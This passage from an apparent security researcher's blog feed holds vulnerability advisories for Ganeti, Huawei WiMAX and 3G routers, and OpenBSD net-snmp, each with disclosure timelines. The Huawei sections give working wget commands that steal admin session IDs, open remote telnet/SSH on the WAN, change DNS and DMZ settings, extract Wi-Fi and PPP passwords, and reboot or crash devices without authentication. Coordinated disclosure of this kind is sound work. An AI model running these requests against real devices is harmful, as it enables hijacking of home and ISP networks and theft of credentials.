Rooting VMs by adding ssh keys and by doing <code>s/PermitRootLogin No/PermitRootLogin Yes/</code> is left as a exercise to the reader.</p>
<p>o Other methods of MiTM exist and are left as a exercise for the reader.</p>
<h2>Proposed Workarounds by the Security Researcher</h2>
<p>At first, I think these steps must be done to improve the security of ganeti:</p>
<p>1/ Forcing the RAPI to listen to 127.0.0.1 instead of 0.0.0.0.</p>
<p>This can be done by adding by default to /etc/default/ganeti:</p>
<pre><code>RAPI_ARGS="-b 127.0.0.1"
</code></pre>
<p>Listening to 127.0.0.1 for ganeti-mond is a good step too (it listens to 0.0.0.0:1815/tcp)</p>
<p>2/ Adding an authentication by default for the RAPI daemon (not only for writing access but for reading access too)</p>
<p>3/ Filtering the output of the jobs to avoid leaking secrets.</p>
<p>Note that the immediate step is to change the secrets used for DRBD and
  to be sure nobody had access to the DRBD blocks, allowing a compromise of all the VMs.</p>
<p>4/ Disabling SSL renegociation and updating the default ciphers.</p>
<p>A personal note: as deploying a working Ganeti platform is very complicated,
attackers will likely giving up before having a working Ganeti platform to study :)</p>
<h2>Vendor Response</h2>
<p>Update to the latest version of Ganeti.</p>
<p>Read details about mitigation measures here: <a href="https://groups.google.com/forum/#!topic/ganeti/9bLyzwmmvdg">https://groups.google.com/forum/#!topic/ganeti/9bLyzwmmvdg</a></p>
<h2>Report Timeline</h2>
<ul>
<li>Jul 30, 2015 : Pierre Kim sends an email to security@ganeti.org asking for a GPG key, email bounced</li>
<li>Jul 30, 2015 : Pierre Kim asks Google Security Team if Ganeti is elligible to the Google Vulnerability Reward Program</li>
<li>Jul 30, 2015 : Pierre Kim sends an email to Ganeti Team for a working security contact</li>
<li>Jul 30, 2015 : Guido Trotter replies by saying to use opensource-ganeti at google.com</li>
<li>Aug 1, 2015: Security@google.com confirms it's out of scope</li>
<li>Aug 4, 2015: Pierre Kim says the exploits are critical and Ganeti is widely used by Google</li>
<li>Aug 11, 2015: Advisories and PoC sent to Google Security Team and Pierre Kim asks Google Security Team to contact Riseup, as they are using Ganeti</li>
<li>Aug 12, 2015: Google Security Team transmitted the information to Ganeti Team</li>
<li>Aug 20, 2015: Google Security Team is working on the scope and the impact of the report</li>
<li>Aug 27, 2015: Google Security Team decided is not within scope of the VRP program but a research grant is awarded as "Security improvement efficacy research"</li>
<li>Aug 28, 2015: Pierre Kims provides information about DRBDv8, DRBDv9. Pierre Kim asks information about the DoS, the condition for the rewards and asks if Riseup was contacted</li>
<li>Sep 10, 2015: Google Security Team confirms they will not contact Riseup and that they ask "that you act and communicate in good faith, use your own best judgement, and we'll do everything we can to work with you to resolve vulnerabilities in a reasonable timeframe"</li>
<li>Oct 6, 2015: Pierre Kim asks for update about the security patchs and informs he will contact Riseup</li>
<li>Oct 6, 2015: Riseup is contacted</li>
<li>Oct 16, 2015: Google Security Team confirm releases end of October and asks about CVEs from MITRE. The Ganeti Bug #1135 is created</li>
<li>Oct 17, 2015: Pierre Kim asks Google to ask MITRE CVE assignments and proposes to contact CNNVD to get a CNNVD entry</li>
<li>Oct 17, 2015: Google Security Team contacted MITRE to get CVEs</li>
<li>Oct 23, 2015: Google Security Team has 2 CVE: CVE-2015-7944 and CVE-2015-7945</li>
<li>Nov 3, 2015: Pierre Kim informs new security with a DoS with the jobs creation</li>
<li>Nov 5, 2015: Ganeti Team has rate-limit to 20 concurrent jobs creation, which limit the problems and declares the patch will be very soon</li>
<li>Nov 17, 2015: Ganeti Team announces new releases next week</li>
<li>Nov 23, 2015: a pre-advisory is sent to Ganeti Team and Google Security Team</li>
<li>Dec 30, 2015: Ganeti Team releases a security advisory</li>
<li>Jan 05, 2015: A public advisory is sent to security mailing lists</li>
</ul>
<h2>Credit</h2>
<p>These vulnerabilities were found by Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>).</p>
<h2>Greetings</h2>
<p>Big thanks to my friends Alexandre Torres, Jordan, Jerome and Stephen.</p>
<p>Thanks to Google Security Team which coordinated the issues by contacting MITRE and the different parties.</p>
<h2>References</h2>
<p><a href="https://pierrekim.github.io/advisories/2016-ganeti-0x00.txt">https://pierrekim.github.io/advisories/2016-ganeti-0x00.txt</a></p>
<p><a href="https://pierrekim.github.io/blog/2016-01-05-Ganeti-Info-Leak-DoS.html">https://pierrekim.github.io/blog/2016-01-05-Ganeti-Info-Leak-DoS.html</a></p>
<p><a href="http://www.ocert.org/advisories/ocert-2015-012.html">http://www.ocert.org/advisories/ocert-2015-012.html</a></p>
<p><a href="https://groups.google.com/forum/#!topic/ganeti/9bLyzwmmvdg">https://groups.google.com/forum/#!topic/ganeti/9bLyzwmmvdg</a></p>
<h2>PoC - GHETTO-BLASTER</h2>
<p>PoC is available here: <a href="https://pierrekim.github.io/advisories/GHETTO-BLASTER">https://pierrekim.github.io/advisories/GHETTO-BLASTER</a>.</p>
<h2>Disclaimer</h2>
<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a></p></content>
    </entry>
    
    <entry>
        <title>Huawei Wimax routers vulnerable to multiple threats</title>
        <link href="2015-12-01-Huawei-Wimax-routers-vulnerable-to-multiple-threats.html"/>
        <content type="html"><h2>Product Description</h2>
<p>Huawei Technologies Co. Ltd. is a Chinese multinational networking
and telecommunications equipment and services company.
It is the largest telecommunications equipment manufacturer in the world.</p>
<h2>Vulnerabilities Summary</h2>
<p>The Huawei BM626e device is a Wimax router / access point overall badly
designed with a lot of vulnerabilities. The device is provided by
MTN Cote d'Ivoire as a "Wibox". It's available in a number of countries to
provide Internet with a Wimax network.</p>
<p>The tests below are done using the last available firmware
(firmware V100R001CIVC24B010).</p>
<p>Note: This firmware is being used by other Huawei Wimax CPEs and
Huawei confirmed that the devices below are vulnerable to the same threats:</p>
<ul>
<li>EchoLife BM626e WiMAX CPE</li>
<li>EchoLife BM626 WiMAX CPE</li>
<li>EchoLife BM635 WiMAX CPE</li>
<li>EchoLife BM632 WiMAX CPE</li>
<li>EchoLife BM631a WiMAX CPE</li>
<li>EchoLife BM632w WiMAX CPE</li>
<li>EchoLife BM652 WiMAX CPE</li>
</ul>
<p>The routers are still on sale and used in several countries. They are used, at least, in these countries:</p>
<ul>
<li>MTN CI (Cote d'Ivoire)</li>
<li>Iran Cell (Iran)</li>
<li>Irak Telecom (Irak)</li>
<li>Libyamax (Libya)</li>
<li>Globe Telecom (Philippines)</li>
<li>Zain Bahrain (Bahrain)</li>
<li>FreshTel (Ukraine)</li>
</ul>
<h2>Details - unauthenticated information disclosure</h2>
<p>By default, the webpage <code>http://192.168.1.1/check.html</code> contains important information
(wimax configuration, network configuration, wifi and sip configuration ...) and is reachable without authentication.</p>
<p>A JavaScript redirection will annoy the attacker (<code>/login.html</code>) and can be easily defeated by using wget:</p>
<pre><code>root@kali:~# wget http://192.168.1.1/check.html; less check.html
</code></pre>
<h2>Details - Admin session cookie hijacking</h2>
<p>If an admin is currently managing the device (OR used the device but didn't properly disconnect),
the current/used session can be stolen by an attacker located in the LAN (or WAN if the HTTP is open in the WAN interface).</p>
<p>The admin session id ("SID") can be recovered in multiple webpages without authentication:</p>
<ul>
<li>http://192.168.1.1/wimax/security.html</li>
<li>http://192.168.1.1/static/deviceinfo.html</li>
<li>...</li>
</ul>
<p>The security.html webpage contains a valid session ID, without authentication, within the JavaScript sources:</p>
<pre><code>sid="SID24188"
</code></pre>
<p>A "protection" is written in JavaScript and will redirect the attacker to the login webpage
but the Javascript contains the session of the admin (sid="SIDXXXXX") so the attacker can retrieve it easily using wget:</p>
<pre><code>root@kali:~# wget http://192.168.1.1/wimax/security.html ; less security.html
root@kali:~# wget http://192.168.1.1/static/deviceinfo.html ; less deviceinfo.html
</code></pre>
<p>Note that, by visiting the webpages, the attacker will also disconnect the administrator from the Control Panel (<code>http://192.168.1.1/</code>)</p>
<h2>Details - Information disclosure and CSRF using the stolen admin session ID</h2>
<p>By using the previously stolen SID, it is possible to perform administration tasks without having proper credentials:</p>
<ul>
<li>editing the WLAN configuration,</li>
<li>editing the WAN configuation,</li>
<li>editing the LAN configuration,</li>
<li>opening HTTP/HTTPS/TELNET/SSH in the LAN and WAN interfaces,</li>
<li>changing DMZ configurations,</li>
<li>editing PortMapping,</li>
<li>editing Porttrigger,</li>
<li>editing SIP configuration,</li>
<li>uploading a custom firmware,</li>
<li>...</li>
</ul>
<p><strong>Retrieve private information (network information):</strong></p>
<pre><code>root@kali:~# wget -qO- 'http://192.168.1.1/static/rethdhcp.jsx?WWW_SID=SID24188&amp;t=0'
Saving to: `STDOUT'

stats={};do{stats.dhcplist="44:8A:5B:AA:AA:AA,192.168.1.3,71:52:02@00:E0:4C:AA:AA:AA,192.168.1.2,71:52:02";
stats.reth="
   eth0      Link encap:Ethernet  HWaddr 34:6B:D3:AA:AA:AA
       UP BROADCAST RUNNING PROMISC MULTICAST  MTU:1500  Metric:1
       RX packets:27 errors:0 dropped:0 overruns:0 frame:0
       TX packets:109 errors:0 dropped:0 overruns:0 carrier:0
       collisions:0 txqueuelen:1000
       RX bytes:2887 (2.8 KiB)  TX bytes:46809 (45.7 KiB)
       Interrupt:9 Base address:0x4000
   eth1      Link encap:Ethernet  HWaddr 34:6B:D3:AA:AA:AA
       UP BROADCAST PROMISC MULTICAST  MTU:1500  Metric:
       RX packets:0 errors:0 dropped:0 overruns:0 frame:0
       TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
       collisions:0 txqueuelen:1000
       RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
       Interrupt:9 Base address:0x4000
    eth2      Link encap:Ethernet  HWaddr 34:6B:D3:AA:AA:AA
       UP BROADCAST RUNNING PROMISC MULTICAST  MTU:1500  Metric:1
       RX packets:2530 errors:0 dropped:0 overruns:0 frame:0
       TX packets:2619 errors:0 dropped:0 overruns:0 carrier:0
       collisions:0 txqueuelen:1000
       RX bytes:351557 (343.3 KiB)  TX bytes:536669 (524.0 KiB)
       Interrupt:9 Base address:0x4000
    eth3      Link encap:Ethernet  HWaddr 34:6B:D3:AA:AA:AA
       UP BROADCAST PROMISC MULTICAST  MTU:1500  Metric:1
       RX packets:0 errors:0 dropped:0 overruns:0 frame:0
       TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
       collisions:0 txqueuelen:1000
       RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
       Interrupt:9 Base address:0x4000
";stats.wlaninfo="
wl0       Link encap:Ethernet  HWaddr 34:6B:D3:AA:AA:AA
       UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
       RX packets:5257 errors:0 dropped:0 overruns:0 frame:0
       TX packets:846 errors:0 dropped:0 overruns:0 carrier:0
       collisions:0 txqueuelen:1000
       RX bytes:1117126 (1.0 MiB)  TX bytes:279600 (273.0 KiB)
 wl1       Link encap:Ethernet  HWaddr 34:6B:D3:AA:AA:AA
       UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
       RX packets:0 errors:0 dropped:0 overruns:0 frame:0
       [...]

root@kali:~#
</code></pre>
<p><strong>Retrieve private information:</strong></p>
<p>An other JSX webpage: <code>http://192.168.1.1/advanced/WANconnect.jsx?WWW_SID=SID24188&amp;&amp;t=0</code></p>
<pre><code>root@kali:~# wget -qO- 'http://192.168.1.1/advanced/WANconnect.jsx?WWW_SID=SID24188&amp;&amp;t=0'
stats={};do{stats.PPPoEStatus='Disconnected'; stats.GREStatus='Disconnected';stats.wpsmode="7";stats.position="Idle,Idle,"}while(0);
</code></pre>
<p>It's possible to get a lot of information by abusing JSX webpages. Listing the JSX webpages is left as an exercise for the reader.</p>
<p>The Session ID can be used to change parameters in the Wimax router too:</p>
<p><strong>Editing the WLAN configuration:</strong></p>
<p>This request will change the first SSID name to 'powned' (you need to edit the WWW_SID, by the one provided in the <code>/wimax/security.html</code> webpage):</p>
<pre><code>root@kali:~# wget --no-cookies --header "Cookie: LoginTimes=0:LoginOverTime=0; FirstMenu=User_1; SecondMenu=User_1_1; ThirdMenu=User_1_1_1" --post-data='WWW_SID=SID24188&amp;REDIRECT=wlan.html&amp;SERVICE=wifi&amp;SLEEP=2&amp;WLAN_WifiEnable=1&amp;Wlan_chkbox=0&amp;WLAN_WirelessMode=9&amp;WLAN_Channel=0&amp;WLAN_SSID1=powned&amp;WLAN_HideSSID=0%3B0%3B&amp;WLAN_AuthMode=WPAPSKWPA2PSK%3BWPAPSKWPA2PSK%3B&amp;WLAN_EncrypType=TKIPAES%3BTKIPAES%3B&amp;WLAN_COUNTRY_REGION=1&amp;WLAN_Country_Code=1d&amp;WLAN_TXPOWER_NOR=13&amp;WLAN_MAXNUM_STA=16%3B16%3B&amp;WLAN_FragThreshold=2346&amp;WLAN_BeaconPeriod=100&amp;WLAN_RTSThreshold=2347&amp;WLAN_BssidNum=2&amp;WLAN_WscConfMode=7&amp;WLAN_WscAction=3&amp;WLAN_CountryCode=CI&amp;WLAN_WscPinCode=&amp;WLAN_TXRATE=0&amp;WLAN_HTBW=0&amp;WLAN_NTH_SSID=1&amp;WLAN_PinFlag=2' http://192.168.1.1/basic/mtk.cgi
</code></pre>
<p><strong>Opening the management interface:</strong></p>
<p>This request will open HTTP/HTTPS/TELNET/SSH in the LAN AND the WAN interfaces (you need to edit the WWW_SID, by the one provided in the <code>/wimax/security.html</code> webpage):</p>
<pre><code>root@kali:~# wget --no-cookies --header "Cookie: LoginTimes=0:LoginOverTime=0; FirstMenu=User_2; SecondMenu=User_2_1; ThirdMenu=User_2_1_0" --post-data='WWW_SID=SID24188&amp;REDIRECT=acl.html&amp;SERVICE=mini_httpd%2Cmini_httpsd%2Ctelnetd%2Cdropbear&amp;SLEEP=2&amp;HTTPD_ENABLE=1&amp;HTTPSD_ENABLE=1&amp;MGMT_WEB_WAN=1&amp;MGMT_TELNET_LAN=1&amp;MGMT_TELNET_WAN=1&amp;MGMT_SSH_LAN=1&amp;MGMT_SSH_WAN=1&amp;HTTPD_PORT=80&amp;httpslan=getValue%28&amp;HTTPSD_PORT=443&amp;TELNETD_PORT=23&amp;SSHD_PORT=22' http://192.168.1.1/basic/mtk.cgi
</code></pre>
<p>(The legit administrator can check the changes here: <code>http://192.168.1.1/advanced/acl.html</code>)</p>
<p><strong>Changing "DMZ action" - redirecting WAN ports to a target client located in the LAN</strong> (you need to edit the WWW_SID, by the one provided in the <code>/wimax/security.html</code> webpage):</p>
<pre><code>root@kali:~# wget --no-cookies --header "Cookie: LoginTimes=0:LoginOverTime=0; FirstMenu=User_2; SecondMenu=User_2_1; ThirdMenu=User_2_1_0" --post-data='WWW_SID=SID24188&amp;REDIRECT=dmz.html&amp;SERVICE=netfilter_dmz&amp;NETFILTER_DMZ_HOST=192.168.1.2&amp;NETFILTER_DMZ_ENABLE=1&amp;DMZInterface=InternetGatewayDevice.WANDevice.1.WANConnectionDevice.1.WANIPConnection.1&amp;DMZHostIPAddress=192.168.1.2&amp;DMZEnable=on&amp;TriggerPort=&amp;TriggerPortEnd=' http://192.168.1.1/advanced/user.cgi
</code></pre>
<p>(The legit administrator can check the changes here: <code>http://192.168.1.1/advanced/dmz.html</code>)</p>
<p>Other actions are possible and are left as an exercise for the reader:</p>
<ul>
<li>Editing PortMapping</li>
<li>Editing Porttrigger</li>
<li>Editing Sip configuration</li>
<li>Uploading a custom firmware</li>
<li>...</li>
</ul>
<h2>Vendor Response</h2>
<p>The vulnerable routers are in the End Of Service cycle and will not be
supported anymore.</p>
<p>The vendor encourages its clients to discard existing unsupported models
and to use new routers.</p>
<p><a href="http://www1.huawei.com/en/security/psirt/security-bulletins/security-notices/hw-464086.htm">Official Huawei Security Notice</a></p>
<h2>Report Timeline</h2>
<ul>
<li>Jul 01, 2015: Vulnerabilities found by Pierre Kim.</li>
<li>Oct 28, 2015: Huawei PSIRT is notified of the vulnerabilities.</li>
<li>Oct 28, 2015: Huawei PSIRT confirms the notification.</li>
<li>Nov 03, 2015: Huawei PSIRT is unable to reproduce the vulnerabilities ("We cannot open the following web pages without authentication")</li>
<li>Nov 03, 2015: Pierre Kim informs Huawei to desactivate JavaScript and gives Huawei a complete scenario with Linux commands. Pierre Kim asks their firmware version.</li>
<li>Nov 04, 2015: Pierre Kim asks Huawei about potential difficulties with the provided scenario.</li>
<li>Nov 05, 2015: Huawei PSIRT says that they are currently working on the firmware version issue and will notify in due course.</li>
<li>Nov 09, 2015: Huawei PSIRT confirms the vulnerabilities affecting EchoLife BM626e WiMAX CPE. "All the versions of this product are vulnerable".</li>
<li>Nov 09, 2015: Pierre Kim asks about 8 other Wimax models which are likely to be vulnerable too (using the same firmware) and asks about if security patches will be distributed or the devices are EoL.</li>
<li>Nov 11, 2015: Huawei PSIRT notifies the investigation of 8 other Wimax models is in progress.</li>
<li>Nov 18, 2015: Huawei PSIRT confirms 6 models are affected (EchoLife BM626 WiMAX CPE, EchoLife BM635 WiMAX CPE, EchoLife BM632 WiMAX CPE, EchoLife BM631a WiMAX CPE, EchoLife BM632w WiMAX CPE, EchoLife BM652 WiMAX CPE). The routers are in the End Of Service cycle and Huawei would not support these models or provide fixed version or patch.</li>
<li>Nov 18, 2015: Huawei PSIRT asks to be notified when the advisory is posted.</li>
<li>Nov 19, 2015: Pierre Kim contacts CERT.org about the vulnerabilities.</li>
<li>Nov 23, 2015: Cert.org assigns VU#406192.</li>
<li>Nov 30, 2015: Pierre Kim indicates to Huawei PSIRT that he will release the advisory the December 1, 2015.</li>
<li>Dec 01, 2015: A public advisory is sent to security mailing lists.</li>
</ul>
<h2>Credit</h2>
<p>These vulnerabilities were found by Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>).</p>
<h2>References</h2>
<p><a href="https://pierrekim.github.io/advisories/2015-huawei-0x01.txt">https://pierrekim.github.io/advisories/2015-huawei-0x01.txt</a></p>
<p><a href="https://pierrekim.github.io/blog/2015-12-01-Huawei-Wimax-routers-vulnerable-to-multiple-threats.html">https://pierrekim.github.io/blog/2015-12-01-Huawei-Wimax-routers-vulnerable-to-multiple-threats.html</a></p>
<h2>Disclaimer</h2>
<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/</p></content>
    </entry>
    
    <entry>
        <title>CVE-2015-8100 - OpenBSD package 'net-snmp' information disclosure</title>
        <link href="2015-11-12-CVE-2015-8100-OpenBSD-package-net-snmp-information-disclosure.html"/>
        <content type="html"><h2>Product Description</h2>
<p>Net-SNMP is a suite of applications used to implement SNMP v1, SNMP v2c and
SNMP v3 using both IPv4 and IPv6.</p>
<p>This software is available in OpenBSD as a port (<code>/usr/ports/net/net-snmp</code>).</p>
<h2>Vulnerabilities Summary</h2>
<p>By default, when OpenBSD package and ports are used, the snmpd configuration file
has weak permissions which allows a local user to retrieve sensitive information.</p>
<h2>Details</h2>
<p>By default the permissions of the snmpd configuration file in OpenBSD
are 0644 instead of 0600:</p>
<pre><code># cd /usr/ports/net/net-snmp
# make install clean
[...]
# ls -latr /etc/snmp/snmpd.conf
-rw-r--r--  1 root  wheel  6993 Nov  4 09:16 /etc/snmp/snmpd.conf
#
</code></pre>
<p>The same problem occurs when the provided package is installed with:</p>
<p><code>pkg_add http://ftp.spline.de/pub/OpenBSD/5.8/packages/i386/net-snmp-5.7.3p0.tgz</code>:</p>
<pre><code># ls -latr /etc/snmp/snmpd.conf
-rw-r--r--  1 root  wheel  6993 Nov  4 08:37 /etc/snmp/snmpd.conf
#
</code></pre>
<p>The snmpd configuration file is readable by a local user and contains the credentials
for read-only and read-write access (for SNMPv1, SNMPv2 and SNMPv3 protocols) and
gives a local user unnecessary/dangerous access:</p>
<pre><code>[...]

rocommunity public  default    -V systemonly
#rocommunity secret  10.0.0.0/16
rouser   authOnlyUser
#rwuser   authPrivUser   priv

[...]
</code></pre>
<p>This problem is OpenBSD-specific as the <code>/var/db/pkg/net-snmp-5.7.3p0/+CONTENTS</code> file confirms:</p>
<pre><code>@ts 1438958635
@sample /etc/snmp/snmpd.conf
</code></pre>
<p>Futhermore, by default, <code>/usr/local/sbin/snmpd</code> runs as root.</p>
<h2>Vendor Response</h2>
<p>This problem has been fixed in the -STABLE and -CURRENT packages.</p>
<h2>Report Timeline</h2>
<ul>
<li>Nov 04, 2015: Vulnerability found by Pierre Kim.</li>
<li>Nov 06, 2015: Stuart Henderson is notified of the vulnerability.</li>
<li>Nov 06, 2015: Stuart Henderson confirms the vulnerability and fixes the package permissions for the sample configuration file in -current and -stable.</li>
<li>Nov 06, 2015: Stuart Henderson re-activates an option (can be configured with rc.conf.local) to run net-snmp as a separate uid to improve security.</li>
<li>Nov 10, 2015: OSS-Security is contacted to get a CVE</li>
<li>Nov 10, 2015: cve-assign@mitre.org assigns CVE-2015-8100</li>
<li>Nov 12, 2015: A public advisory is sent to security mailing lists.</li>
</ul>
<h2>Credit</h2>
<p>This vulnerability was found by Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>).</p>
<h2>References</h2>
<p><a href="https://pierrekim.github.io/advisories/CVE-2015-8100-openbsd-net-snmp.txt">https://pierrekim.github.io/advisories/CVE-2015-8100-openbsd-net-snmp.txt</a></p>
<p><a href="http://openports.se/net/net-snmp">http://openports.se/net/net-snmp</a></p>
<h2>Disclaimer</h2>
<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a></p>
<h2>Complete advisory:</h2>
<pre><code>-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

## Advisory Information

Title: OpenBSD package 'net-snmp' information disclosure
Advisory URL: https://pierrekim.github.io/advisories/CVE-2015-8100-openbsd-net-snmp.txt
Blog URL: https://pierrekim.github.io/blog/2015-11-12-CVE-2015-8100-OpenBSD-package-net-snmp-information-disclosure.html
Date published: 2015-11-12
Vendors contacted: Stuart Henderson, OpenBSD Package maintainer
Release mode: Released
CVE: CVE-2015-8100



## Product Description

Net-SNMP is a suite of applications used to implement SNMP v1, SNMP v2c and
SNMP v3 using both IPv4 and IPv6.

This software is available in OpenBSD as a port (/usr/ports/net/net-snmp).



## Vulnerabilities Summary

By default, when OpenBSD package and ports are used, the snmpd configuration file
has weak permissions which allows a local user to retrieve sensitive information.



## Details

By default the permissions of the snmpd configuration file in OpenBSD
are 0644 instead of 0600:

# cd /usr/ports/net/net-snmp
# make install clean
[...]
# ls -latr /etc/snmp/snmpd.conf
-rw-r--r--  1 root  wheel  6993 Nov  4 09:16 /etc/snmp/snmpd.conf
#

The same problem occurs when the provided package is installed with
`pkg_add http://ftp.spline.de/pub/OpenBSD/5.8/packages/i386/net-snmp-5.7.3p0.tgz`:

# ls -latr /etc/snmp/snmpd.conf
-rw-r--r--  1 root  wheel  6993 Nov  4 08:37 /etc/snmp/snmpd.conf
#

The snmpd configuration file is readable by a local user and contains the credentials
for read-only and read-write access (for SNMPv1, SNMPv2 and SNMPv3 protocols) and
gives a local user unnecessary/dangerous access:


[...]

rocommunity public  default    -V systemonly
#rocommunity secret  10.0.0.0/16
rouser   authOnlyUser
#rwuser   authPrivUser   priv

[...]

This problem is OpenBSD-specific as the /var/db/pkg/net-snmp-5.7.3p0/+CONTENTS file confirms:
@ts 1438958635
@sample /etc/snmp/snmpd.conf

Futhermore, by default, `/usr/local/sbin/snmpd` runs as root.



## Vendor Response

This problem has been fixed in the -STABLE and -CURRENT packages.



## Report Timeline

* Nov 04, 2015: Vulnerability found by Pierre Kim.
* Nov 06, 2015: Stuart Henderson is notified of the vulnerability.
* Nov 06, 2015: Stuart Henderson confirms the vulnerability and fixes the package permissions for the sample configuration file in -current and -stable.
* Nov 06, 2015: Stuart Henderson re-activates an option (can be configured with rc.conf.local) to run net-snmp as a separate uid to improve security.
* Nov 10, 2015: OSS-Security is contacted to get a CVE
* Nov 10, 2015: cve-assign@mitre.org assigns CVE-2015-8100
* Nov 12, 2015: A public advisory is sent to security mailing lists.



## Credit

This vulnerability was found by Pierre Kim (@PierreKimSec).



## References

https://pierrekim.github.io/advisories/CVE-2015-8100-openbsd-net-snmp.txt
http://openports.se/net/net-snmp



## Disclaimer

This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBCgAGBQJWRKFEAAoJEMQ+Dtp9ky28Jq4P/iUv706dteWtl9HkPHkSVbql
yO8ZJGnJtEXX3SOR5OKd07rxwP4W1gIYJtLSTUfEk+91LRpP8ZNgDIMDG1pIKS5l
2S+6SQ+8yQXCcnm54KAc8DQM3tJHUp/RG8/6UR30V0v83ELnLmAX01BWOMEIvle2
N1cd59cPUZ4Qafee1p8wbyDWi1WBB1d89d7YKf3v78L34COTEBXPRLPs+DQCU7nD
vmGzsFKcNjr8Hr2pq9aQmNmmuE82GtuEk3e1OKR5Pe4uYWoEAuFJOnswFjABDSch
0wvWx1d6G2iOMwPIRLL+BXMgGzPpKB4KjgYPH/3OYJVXywKfEw0pBnu+Svb31/JV
MVnnw6+fuunOLe7GxrI4M5FE2JfMD4CUiarFHRK6I5XDJm1dsvTHIsJUwA+9FTTH
7kJY/xKHJ3YpjrKT2K2WAmvsJCTswkbvPr5LKNGgOLlUzVUetYo1hhGT6fo5ppQE
RMpWkpX1DGJ+5RzlcLhLqguznv/SVwAA78TwailvF28LW2kSHJDOIpUht2xRdQ2Q
JJZwcoO69qsterKF+UCcucWXDSjUjzI/Vrvm/aV+BAu4oKVG5QvVNplbHDYruLl5
9OMF1C5+z8GcQf27u1RG69VAOx66GnPFGTPUiaKfsgqfh3jEMJw3IlT1LBCAZao4
FXQizA+QOejXTiuHqYE9
=qkHs
-----END PGP SIGNATURE-----
</code></pre></content>
    </entry>
    
    <entry>
        <title>A comprehensive study of Huawei 3G routers - XSS, CSRF, DoS, unauthenticated firmware update, RCE</title>
        <link href="2015-10-07-Huawei-routers-vulnerable-to-multiple-threats.html"/>
        <content type="html"><h2>Product Description</h2>
<p>Huawei Technologies Co. Ltd. is a Chinese multinational networking and telecommunications equipment and services company.
It is the largest telecommunications equipment manufacturer in the world.</p>
<h2>Vulnerabilities Summary</h2>
<p>The Huawei B260A device is a 3g modem / access point overall badly designed with a lot of vulnerabilities. The device is provided by Orange Tunisia as a "Flybox". It's available in a lot of countries to provide Internet with a 3G network (Vodafone provides this device, for example). </p>
<p>The tests below are done using the last available firmware (firmware 846.11.15.08.115 - Feb 20 2013).</p>
<p>Note: This firmware seems to be used for these 14 Huawei devices (from http://192.168.1.1/js/u_version.js ) which, therefore, are likely to be vulnerable to the same threats:</p>
<ul>
<li>E960, WLA1GCPU</li>
<li>E968, WLA1GCYU</li>
<li>B970, WLA1GAPU</li>
<li>B932, WLB1TIPU</li>
<li>B933, WLB1TIPU</li>
<li>B220, WLA1GCYU</li>
<li>B260, WLA1GCYU</li>
<li>B270, WLA1GCYU</li>
<li>B972, WLA1GCYU</li>
<li>B200-20, WLB3TILU</li>
<li>B200-30, WLB3TILU</li>
<li>B200-40, WLB3TILU</li>
<li>B200-50, WLB3TILU</li>
<li>??, WLA1GCPU</li>
</ul>
<h2>Details - Cookies</h2>
<p>The Huawei B260A stores the administrator's account name and password in cleartext in a cookie (using base64),
which allows context-dependent attackers to obtain sensitive information by(1) reading a cookie file
and (2) sniffing the network for HTTP headers, and possibly (3) using unspecified other vectors. </p>
<p>The cookie is:</p>
<pre><code>Cookie: Basic=admin:base64(password):0
</code></pre>
<h2>Details - Authentication bypass</h2>
<p>Remote reboot without authentication:</p>
<pre><code>wget -qO- --post-data='action=Reboot&amp;page=resetrouter.asp' http://192.168.1.1/en/apply.cgi
</code></pre>
<p>Second remote reboot without authentication:</p>
<pre><code>wget -qO- --post-data='action=Apply&amp;page=lancfg.asp' 'http://192.168.1.1/en/apply.cgi'
</code></pre>
<p>Grab wifi password without authentication:</p>
<pre><code>wget -qO- 'http://192.168.1.1/js/wlan_cfg.js'|less
</code></pre>
<p>Get PPP passwords without authentication:</p>
<pre><code>wget -qO- 'http://192.168.1.1/js/connection.js'|grep -i 'var profile'
var profile = [["Orange TN","*99#","FIXME","FIXME","0","flyboxgp","1","","0",],[]];
</code></pre>
<p>Grab informations (wifi password, PPP passwords) without authentication:</p>
<pre><code>wget -qO- http://192.168.1.1/js/wizard.js
var current_profile_list = ["Orange TN","*99#","","","0","flyboxgp","1","",];
var profile = [["Orange TN","*99#","","","0","flyboxgp","1","",],[]];
var nv_wl_wpa_psk = "E56479874EB39DB3BC65D8374B";              /**/
var nv_wl_key1 = "";                    /**/
[...]
</code></pre>
<h2>Details - CSRF without authentication</h2>
<p>Change remote DNS without authentication: it allows an attacker to change the upstream DNS servers, so it will impact the clients served by the local dhcpd from the Huawei B260A:</p>
<pre><code>wget -qO- --post-data='lan_lease=86400&amp;dns_settings=static&amp;primary_dns=1.1.3.1&amp;secondary_dns=3.3.3.3&amp;lan_proto=dhcp&amp;dhcp_start=192.168.1.100&amp;dhcp_end=192.168.1.200&amp;lan_ipaddr=192.168.1.1&amp;lan_gateway=192.168.1.1&amp;lan_netmask=255.255.255.0&amp;action=Apply&amp;page=lancfg.asp' 'http://192.168.1.1/en/apply.cgi'
</code></pre>
<p>This can easily be done using a CSRF attack.</p>
<p>Apparently, there are CSRF everywhere (<em>EVERYWHERE</em>).</p>
<h2>Details - Remote DoS without authentication</h2>
<p>Remote DoS against the HTTP server without authentication:</p>
<pre><code>root@linux:~# telnet 192.168.1.1 80
Trying 192.168.1.1...
Connected to 192.168.1.1.
Escape character is '^]'.
x   
Connection closed by foreign host.
